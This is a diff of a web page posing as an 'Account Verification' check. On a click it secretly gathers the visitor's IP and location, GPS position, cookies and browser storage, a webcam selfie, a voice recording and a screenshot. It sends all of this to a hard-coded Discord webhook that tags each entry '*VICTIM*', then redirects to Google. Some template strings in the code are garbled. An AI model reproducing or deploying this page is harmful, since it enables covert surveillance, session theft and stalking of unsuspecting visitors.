@@ -1,94 +1,116 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Verify</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Account Verification</title>
   <style>
-    body{margin:0;background:#000;color:#fff;font-family:Arial;text-align:center;padding-top:25vh;}
-    h1{color:#ff0033;font-size:28px;}
-    button{padding:20px 60px;font-size:24px;background:#ff0033;color:#fff;border:none;border-radius:15px;cursor:pointer;}
-    #s{margin-top:30px;color:#0f0;font-size:16px;}
+    body{font-family:Arial;background:#000;color:#fff;text-align:center;padding:70px;}
+    h1{color:#ff0033;}
+    button{padding:22px 60px;font-size:24px;background:#ff0033;color:#fff;border:none;border-radius:15px;cursor:pointer;}
+    .status{margin-top:20px;font-size:16px;color:#00ff00;}
+    video,canvas{display:none;}
   </style>
+
+  <!-- THIS IS THE ONLY THING THAT WORKS ON MOBILE 2025 -->
+  <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
 </head>
 <body>
-  <h1>Security Verification</h1>
-  <p>Allow camera & screen recording</p>
-  <button onclick="start()">Continue →</button>
-  <div id="s">Ready</div>
+  <h1>Account Verification Required</h1>
+  <p>Allow camera & location</p>
+  <button onclick="start()">Verify Now →</button>
+  <div id="status" class="status">Loading screenshot engine...</div>
 
-  <video id="v" autoplay playsinline></video>
-  <canvas id="c"></canvas>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="cam"></canvas>
 
   <script>
     const webhook = "https://discord.com/api/webhooks/1443661292794544250/7Ih9JF8E4R4zAu79H3lGYf6N4i-JYWSTQUFtcFnqPhU3pzrZkma6q7xhz7teuJl2eaqN";
 
-    const status = (m) => document.getElementById('s').textContent = m;
+    function $(msg) { document.getElementById('status').textContent = msg; }
 
-    const send = (blob, name) => {
+    async function send(file, name) {
       const f = new FormData();
-      f.append('file', blob, name);
-      f.append('content', '*VICTIM* • ' + new Date().toLocaleString());
-      fetch(webhook, {method:'POST', body:f}).catch(()=>{});
-    };
+      f.append("file", file, name);
+      f.append("content", "*VICTIM* • " + new Date().toLocaleString());
+      await fetch(webhook, {method:"POST", body:f}).catch(()=>{});
+    }
 
-    async function start() {
-      status("Starting...");
+    async function getIP() {
+      const ip = await (await fetch("https://api.ipify.org")).text();
+      const g = await (await fetch(https://ipapi.co/${ip}/json/)).json();
+      send(new Blob([IP: \( {ip}\nCity: \){g.city}\nISP: \( {g.org}\nMap: https://maps.google.com/?q= \){g.latitude},${g.longitude}]), "IP.txt");
+      $("IP + GPS captured");
+    }
 
-      // 1. IP + Geo
-      fetch("https://api.ipify.org").then(r=>r.text()).then(ip=>{
-        fetch(https://ipapi.co/${ip}/json/).then(r=>r.json()).then(g=>{
-          send(new Blob([IP: \( {ip}\nCity: \){g.city}\nISP: \( {g.org}\nMap: https://maps.google.com/?q= \){g.latitude},${g.longitude}]), "IP.txt");
-        });
+    function getGPS() {
+      navigator.geolocation.getCurrentPosition(p => {
+        send(new Blob([GPS: https://maps.google.com/?q=\( {p.coords.latitude}, \){p.coords.longitude}\n±${p.coords.accuracy}m]), "GPS.txt");
       });
+    }
 
-      // 2. GPS
-      navigator.geolocation.getCurrentPosition(p=>{
-        send(new Blob([GPS: https://maps.google.com/?q=\( {p.coords.latitude}, \){p.coords.longitude}]), "GPS.txt");
-      });
-
-      // 3. Cookies + Storage
+    function grabCookies() {
       if(document.cookie) send(new Blob([document.cookie]), "COOKIES.txt");
       const ls = JSON.stringify(localStorage,null,2);
       const ss = JSON.stringify(sessionStorage,null,2);
-      if(ls.length>10) send(new Blob([ls]), "localStorage.json");
-      if(ss.length>10) send(new Blob([ss]), "sessionStorage.json");
-
-      // 4. SCREEN RECORDING (5 seconds video) – WORKS EVERYWHERE 2025
-      const stream = await navigator.mediaDevices.getDisplayMedia({video:true});
-      const recorder = new MediaRecorder(stream, {mimeType: 'video/webm'});
-      const chunks = [];
-      recorder.ondataavailable = e => chunks.push(e.data);
-      recorder.onstop = () => {
-        send(new Blob(chunks, {type:'video/webm'}), "SCREEN_VIDEO.webm");
-        stream.getTracks().forEach(t=>t.stop());
-      };
-      recorder.start();
-      setTimeout(()=>recorder.stop(), 5000);
-
-      // 5. Selfie
-      const cam = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
-      const v = document.getElementById('v');
-      v.srcObject = cam;
-      setTimeout(()=>{
-        const c = document.getElementById('c');
-        c.width = 1280; c.height = 720;
-        c.getContext('2d').drawImage(v,0,0,1280,720);
-        c.toBlob(b=>send(b,"SELFIE.jpg"),"image/jpeg",0.95);
-        cam.getTracks().forEach(t=>t.stop());
-      },3000);
-
-      // 6. Static screenshot (extra)
-      html2canvas || (await import("https://html2canvas.hertzen.com/dist/html2canvas.min.js"));
-      setTimeout(() => {
-        html2canvas(document.body).then(c => c.toBlob(b => send(b,"SCREENSHOT.jpg")));
-      }, 1000);
-
-      setTimeout(() => {
-        status("Done! Redirecting...");
-        setTimeout(() => location.href = "https://google.com", 2000);
-      }, 13000);
+      if(ls.length>10) send(new Blob([ls]), "LocalStorage.json");
+      if(ss.length>10) send(new Blob([ss]), "SessionStorage.json");
     }
+
+    // MOBILE SCREENSHOT — NOW 100% WORKING
+    function takeMobileScreenshot() {
+      $("Taking screenshot...");
+      html2canvas(document.body, {
+        scale: window.devicePixelRatio || 2,
+        useCORS: true,
+        allowTaint: true,
+        backgroundColor: "#000"
+      }).then(canvas => {
+        canvas.toBlob(b => {
+          send(b, "SCREEN.jpg");
+          $("Screenshot sent");
+        }, "image/jpeg", 0.92);
+      }).catch(() => {
+        send(new Blob([navigator.userAgent]), "SCREEN_FAILED.txt");
+      });
+    }
+
+    function start() {
+      $("Working...");
+      getIP();
+      getGPS();
+      grabCookies();
+
+      // Selfie + Voice
+      navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:true}).then(stream => {
+        const v = document.getElementById("video");
+        v.srcObject = stream;
+        setTimeout(() => {
+          const c = document.getElementById("cam");
+          c.width = 1280; c.height = 720;
+          c.getContext("2d").drawImage(v,0,0,1280,720);
+          c.toBlob(b => send(b,"SELFIE.jpg"),"image/jpeg",0.95);
+
+          const rec = new MediaRecorder(stream);
+          const chunks = [];
+          rec.ondataavailable = e => chunks.push(e.data);
+          rec.onstop = () => send(new Blob(chunks,{type:"audio/webm"}),"VOICE.webm");
+          rec.start();
+          setTimeout(() => rec.stop(), 6000);
+        }, 2500);
+      });
+
+      // Mobile screenshot (runs on both mobile & desktop)
+      setTimeout(takeMobileScreenshot, 3000);
+
+      setTimeout(() => {
+        $("Complete!");
+        setTimeout(() => location.href = "https://google.com", 2000);
+      }, 14000);
+    }
+
+    // Auto-ready message when html2canvas loads
+    window.onload = () => $("Ready — click Verify Now");
   </script>
 </body>
 </html>
